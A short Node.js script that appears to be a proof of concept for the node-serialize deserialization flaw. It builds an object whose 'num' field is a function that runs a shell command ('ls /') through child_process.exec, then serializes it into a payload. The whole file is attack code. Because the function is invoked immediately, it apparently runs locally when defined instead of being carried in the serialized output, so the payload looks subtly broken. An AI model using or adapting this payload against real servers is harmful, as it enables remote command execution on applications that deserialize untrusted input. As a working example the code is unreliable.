var y =
{
	"username":"Dummy",
	"country":"Idk Probably Somewhere Dumb",
	"city":"Lametown",
	"num":function(){
	require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
	}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
